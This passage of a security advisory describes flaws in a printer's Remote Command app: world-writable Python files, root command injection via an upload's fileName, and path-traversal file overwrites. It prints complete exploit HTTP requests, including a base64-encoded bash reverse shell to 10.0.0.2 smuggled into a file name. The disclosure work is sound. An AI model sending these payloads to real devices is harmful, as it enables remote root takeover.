drwxrwxrwx 2 apache trusted 4096 Mar 15 11:49 10000000-0000-0000-0000-500000000000
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:50 .

./latest/10000000-0000-0000-0000-500000000000:
total 184
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:49 .
-rwxrwxrwx 1 apache trusted 176778 Mar 15 11:49 apppackage.zip
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..

./latest/10000000-0000-0000-0000-500000000001:
total 256 
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:50 .
-rwxrwxrwx 1 apache trusted 250054 Mar 15 11:50 apppackage.zip
</code></pre>
<p>The app directory is also insecure, due to incorrect permissions everywhere:</p>
<p>Content of <code>/application/app</code>:</p>
<pre><code>bash-4.1# pwd
/application/app
bash-4.1# ls -la
total 16
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 .
drwxr-xr-x 8 root   root    4096 Mar 15 11:49 ..
drwx--x--- 6 apache trusted 4096 Apr 10 18:42 10000000-0000-0000-0000-500000000000
drwx--x--- 6 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
bash-4.1# ls -la /application/app/10000000-0000-0000-0000-500000000000
total 24
drwx--x--- 6 apache trusted 4096 Apr 10 18:42 . 
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
bash-4.1#
</code></pre>
<p>Analysis of <code>/application/app/10000000-0000-0000-0000-500000000000</code>, with insecure permissions:</p>
<pre><code>10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views:
total 48
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
-rwxrwxrwx 1 apache trusted   67 Apr 11  2022 __init__.py
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
-rwxrwxrwx 1 apache trusted 6334 Apr 11  2022 command.py
-rwxrwxrwx 1 apache trusted 2882 Apr 11  2022 device.py
-rwxrwxrwx 1 apache trusted 1018 Apr 11  2022 history.py
-rwxrwxrwx 1 apache trusted 1144 Apr 11  2022 localization.py
-rwxrwxrwx 1 apache trusted  982 Apr 11  2022 resultstorage.py
-rwxrwxrwx 1 apache trusted 1933 Apr 11  2022 storage.py
-rwxrwxrwx 1 apache trusted 3103 Apr 11  2022 view.py

10000000-0000-0000-0000-500000000000/package/program/settingapp/server/worker:
total 16
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
-rwxrwxrwx 1 apache trusted 1892 Apr 11  2022 commandthread.py


package/program/settingapp/server/worker:
total 16
-rwxrwxrwx 1 apache trusted 1892 Apr 11  2022 commandthread.py
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .

package/program/settingapp/server/worker/__pycache__:
total 12
-rw-rw-rw- 1 apache trusted 1968 Apr 10 17:42 commandthread.cpython-35.pyc
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 .

package/program/backgroundapp:
total 68
-rwxrwxrwx 1 apache trusted 21409 Apr 11  2022 filefunction.py
-rwxrwxrwx 1 apache trusted  3738 Apr 11  2022 exclusivecontrol.py
-rwxrwxrwx 1 apache trusted 24233 Apr 11  2022 eventhandler.py
-rwxrwxrwx 1 apache trusted  1326 Apr 11  2022 backgroundapp.py
drwx--x--- 5 apache trusted  4096 Mar 15 11:49 ..
drwx--x--- 3 apache trusted  4096 Mar 15 11:50 .
drwxrwxrwx 2 root   trusted  4096 Mar 15 11:50 __pycache__
</code></pre>
<p>By default, the applications are stored inside <code>/application/app</code>.</p>
<p>We can confirm that the Python scripts have insecure permissions, allowing any local user to overwrite them and get a Local Privilege Escalation.</p>
<p>A remote attacker using the insecure upload functionality will be able to overwrite any Python file and get Remote Code Execution.</p>
<p>A local attacker can overwrite any file.</p>
<p><a id="rce-command-injection"></a></p>
<h2>Details - Remote Code Execution - command injection as root</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution as root.</p>
<p>When uploading a file with the fileName <code>|id</code>, the command <code>id</code> will be executed as root on the printer. There is a command injection inside the <code>fileName</code> variable:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd-rce-01.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-rce-01-full.png">Click here for full image</a></p>
<p>The HTTP request is:</p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/execute HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"test","fileName":"|id"}
</code></pre>
<p>And the command <code>id</code> will be executed as root on the printer:</p>
<pre>
2023/04/10 18:16:07 CMD: UID=0     PID=10794  | sh -c chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test3.test|id
<font color=red>2023/04/10 18:16:07 CMD: UID=0     PID=10796  | id</font>
2023/04/10 18:16:07 CMD: UID=0     PID=10795  | chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test3.test
</pre>

<p>A PoC is provided, allowing getting a connect-back shell as root:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd-rce-02.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-rce-02-full.png">Click here for full image</a></p>
<p>The HTTP request is:</p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/execute HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 345
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"test-exec.zip$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==|base64 -d|bash)"}
</code></pre>
<p>The malicious payload is generated using base64 to remove bad characters. It is a standard connect-back shell, connecting to 10.0.0.2 to port 80 over TCP:</p>
<pre><code>kali% echo 'bash -i &gt;&amp; /dev/tcp/10.0.0.2/80 0&gt;&amp;1' | base64 -w0;echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==
</code></pre>
<p>The resulting command is executed on the printer:</p>
<pre><code>root     13040  0.0  0.1  13260  2344 ?        S    18:50   0:00 sh -c chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test-exec.zip$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==|base64 -d|bash)
</code></pre>
<p>And we can confirm the command was executed from Python, from the parent processus alappmanager:</p>
<pre>
bash-4.1# pstree
init-+-MemoryCaptureSt---MemoryCapture---sleep
     |-aleSCL
     |-alhp9100---21*[{alhp9100}]
     |-2*[alipp---2*[{alipp}]]
     |-allld2d
     |-alllmnr
     |-allprng---21*[{allprng}]
     |-alnetefiRemotei
     |-alstage2-+-alstage2
     |          `-23*[{alstage2}]
     |-alusbPrint---2*[{alusbPrint}]
     |-alwsdiscovery
     |-alwsmex
     |-alwsprint---{alwsprint}
     |-alwsscanner---3*[{alwsscanner}]
     |-bash---pspy32---9*[{pspy32}]
     |-cissm-+-alAddressBookMg
     |       |-alCloning
     |       |-alExportImport
     |       |-alLogRetriever
     |       |-alLogmanager---{alLogmanager}
     |       |-alPanelStartLED---{alPanelStartLE}
     |       |-alPanelUIMessag---{alPanelUIMessa}
     |       |-alServiceUIPlug
     |       |-alUiFrameWork---21*[{alUiFrameWork}]
     |       |-alViewPlugin---3*[{alViewPlugin}]
     |       |-alaccountmgr---2*[{alaccountmgr}]
<font color=red>     |       |-alappmanager-+-python-+-sh---sh---bash---bash---pstree</font>
     |       |              |        `-5*[{python}]
     |       |              |-python---5*[{python}]
     |       |              `-15*[{alappmanager}]
[...]
</pre>

<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script, with sources on lines 34 and 59:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">CommandView</span>(View):
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;upload_command_file&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;json&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">26</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_command_file</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">27</span>         Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;start upload command file to appstorage&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">30</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">33</span>             <span style="color: #408080; font-style: italic"># configure file path that specified using File API</span>
 <span style="color: #666666">34</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body                    [<span style="color: #666666">1</span>] get value <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">attacker</span>
 <span style="color: #666666">35</span>             Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;request body: &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads))
[<span style="color: #666666">...</span>]
 <span style="color: #666666">59</span>             commandRunner <span style="color: #666666">=</span> CommandThread(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>])  [<span style="color: #666666">2</span>] execute a commands <span style="color: #008000; font-weight: bold">with</span> the name controlled by the attacker
 <span style="color: #666666">60</span>             commandthread <span style="color: #666666">=</span> eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>AppThread<span style="color: #666666">.</span>create(commandRunner)
 <span style="color: #666666">61</span>             commandthread<span style="color: #666666">.</span>start()
</pre></div>

<p>The <code>CommandThread</code> class is implemented in <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/worker/commandthread.py</code> and is a wrapper to <code>remoteCommandObj.execute()</code> where we can find the sink:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">33</span>             file_path <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/command/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(<span style="color: #008000">self</span><span style="color: #666666">.</span>commandName)
 <span style="color: #666666">34</span> 
 <span style="color: #666666">35</span>             remoteCommandObj <span style="color: #666666">=</span> eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>RemoteCommand<span style="color: #666666">.</span>create()
 <span style="color: #666666">36</span>             result <span style="color: #666666">=</span> remoteCommandObj<span style="color: #666666">.</span>execute(eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>AppStorageType<span style="color: #666666">.</span>AppStorageType_Normal, file_path, eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>RemoteCommandUser<span style="color: #666666">.</span>RemoteCommandUser_Admin, <span style="color: #008000">True</span>, result_dir_path)
 <span style="color: #666666">37</span>             <span style="color: #408080; font-style: italic"># Logger.w(str(result))</span>
 <span style="color: #666666">38</span> 
 <span style="color: #666666">39</span>             res_status <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getStatus()
 <span style="color: #666666">40</span>             ExcecutionStatus<span style="color: #666666">.</span>STATUS <span style="color: #666666">=</span> <span style="color: #008000">str</span>(res_status)
 <span style="color: #666666">41</span>             Logger<span style="color: #666666">.</span>w(<span style="color: #BA2121">&quot;command status: &quot;</span> <span style="color: #666666">+</span> ExcecutionStatus<span style="color: #666666">.</span>STATUS)
 <span style="color: #666666">42</span>             command_type <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getType()
 <span style="color: #666666">43</span>             ExcecutionStatus<span style="color: #666666">.</span>COMMANDTYPE <span style="color: #666666">=</span> command_type <span style="color: #666666">=</span> <span style="color: #008000">str</span>(command_type)
 <span style="color: #666666">44</span>             Logger<span style="color: #666666">.</span>w(<span style="color: #BA2121">&quot;command type: &quot;</span> <span style="color: #666666">+</span> ExcecutionStatus<span style="color: #666666">.</span>COMMANDTYPE)
 <span style="color: #666666">45</span>             ExcecutionStatus<span style="color: #666666">.</span>RESULTFILENAME <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getFileName()<span style="color: #666666">.</span>split(<span style="color: #BA2121">&#39;/&#39;</span>)[<span style="color: #666666">-1</span>]
</pre></div>

<p>A remote attacker can get Remote Code Execution as root.</p>
<p><a id="rce-insecure-upload-01"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution by overwriting existing files (e.g. Python files containing executable code). </p>
<p>The Remote Command application allows uploading documents (as zip files) using the <code>/aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/upload_command_file</code> API. When sending a zip file with the filename <code>../</code>, it is possible to overwrite any file within the directory of the Python application.</p>
<p>By default, when uploading a file through the web interface of the Remote Command application, the file will be copied into 3 different directories:</p>
<ul>
<li><code>/work/al/tmp/remotecommand/</code></li>
<li><code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/command/</code></li>
<li><code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/remotecommand/</code></li>
</ul>
<p>The <code>/application/app/10000000-0000-0000-0000-500000000000/</code> directory corresponds to the Remote Command application which is installed by default.</p>
<p>This <code>/application/app/10000000-0000-0000-0000-500000000000/</code> directory has several directories containing Python scripts:</p>
<pre><code>bash-4.1# pwd
/application/app/10000000-0000-0000-0000-500000000000
bash-4.1# ls -la
total 24
drwx--x--- 6 apache trusted 4096 Apr 10 18:40 .
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
bash-4.1#
</code></pre>
<p>An attacker uploading a zip file with a filename containing <code>../../</code> will be able to overwrite any file in <code>/application/app/10000000-0000-0000-0000-500000000000</code> and in subdirectories of <code>/application/app/10000000-0000-0000-0000-500000000000</code>:</p>
<p>Malicious HTTP request sent to the Remote Command application: </p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/upload_command_file HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest 
Content-Length: 278
Origin: http://10.0.0.1:8080 
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"../../../test-get-cmd.zip"}
</code></pre>
<p>The resulting file is now located in <code>/application/app/10000000-0000-0000-0000-500000000000</code>:</p>
<pre><code>bash-4.1# ls -la /application/app/10000000-0000-0000-0000-500000000000
total 28
drwx--x--- 6 apache trusted 4096 Apr 10 18:41 .
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
-rw-rw-rw- 1 apache trusted  171 Apr 10 18:41 test-get-cmd.zip
bash-4.1#
</code></pre>
<p>An attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">CommandView</span>(View):
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;upload_command_file&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;json&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">26</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_command_file</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">27</span>         Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;start upload command file to appstorage&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">30</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">33</span>             <span style="color: #408080; font-style: italic"># configure file path that specified using File API</span>
 <span style="color: #666666">34</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body                                         [<span style="color: #666666">1</span>] get value <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">attacker</span>
 <span style="color: #666666">35</span>             Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;request body: &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads))
[<span style="color: #666666">...</span>]
 <span style="color: #666666">55</span>             command_path <span style="color: #666666">=</span> storage_rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/command/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>]) [<span style="color: #666666">2</span>] generate a path controlled by the attacker
 <span style="color: #666666">56</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(command_path<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;utf-8&#39;</span>), mode<span style="color: #666666">=</span><span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> _file:              [<span style="color: #666666">3</span>] <span style="color: #008000">open</span> this path
 <span style="color: #666666">57</span>                 _file<span style="color: #666666">.</span>write(binary_data)                                              [<span style="color: #666666">4</span>] write content to the path
[<span style="color: #666666">...</span>]
</pre></div>

<p>The vulnerable source code can be seen to:</p>
<ul>
<li>get value from the attacker on line 34</li>
<li>generate a path based on the value provided by the attacker on line 55</li>
<li>open this path on line 56</li>
<li>write content to the path on line 57</li>
</ul>
<p>A remote attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p><a id="rce-insecure-upload-02"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution.</p>
<p>The Remote Command application allows uploading documents (as zip files) using the <code>/aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/get_command_info</code> API. When sending a zip file with the filename <code>../</code>, it is possible to overwrite any file within the directory of the Python application.</p>
<p>Malicious HTTP request sent to the Remote Command application: </p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/get_command_info HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 269
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"test-get-cmd.zip"}
</code></pre>
<p>Such file will be stored inside <code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/command_info/test-get-cmd.zip</code>. Using <code>../</code> will allow an attacker to store the resulting file in an attacker-controlled path, overwriting Python scripts, for example.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script. The <code>fileName</code> value is controlled by the attacker on line 142:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">113</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;get_command_info&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>)
<span style="color: #666666">114</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">get_command_info</span>(<span style="color: #008000">self</span>):
[<span style="color: #666666">...</span>]
<span style="color: #666666">127</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body
[<span style="color: #666666">...</span>]
<span style="color: #666666">131</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
<span style="color: #666666">141</span>             binary_data <span style="color: #666666">=</span> base64<span style="color: #666666">.</span>b64decode(payloads[<span style="color: #BA2121">&#39;file&#39;</span>]<span style="color: #666666">.</span>encode())
<span style="color: #666666">142</span>             command_path <span style="color: #666666">=</span> storage_rootpath <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/command_info/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>]) [<span style="color: #666666">1</span>] <span style="color: #008000">open</span> a <span style="color: #008000">file</span> <span style="color: #008000; font-weight: bold">with</span> the path controlled by the attacker
<span style="color: #666666">143</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(command_path<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;utf-8&#39;</span>), mode<span style="color: #666666">=</span><span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> _file:
<span style="color: #666666">144</span>                 _file<span style="color: #666666">.</span>write(binary_data)
[<span style="color: #666666">...</span>]
</pre></div>

<p>A remote attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p><a id="lfi"></a></p>
<h2>Details - Local File Inclusion</h2>
<p>It was observed that the Remote Command program allows an attacker to read any file using a Local File Inclusion vulnerability.</p>
<p>The Remote Command application allows retrieving files. Such code is implemented inside the <code>resultstorage</code> API.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/resultstorage.py</code> Python script. The <code>filename</code> value is controlled by the attacker on line 21:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>[<span style="color: #666666">...</span>]
 <span style="color: #666666">16</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;resultstorage&#39;</span>)
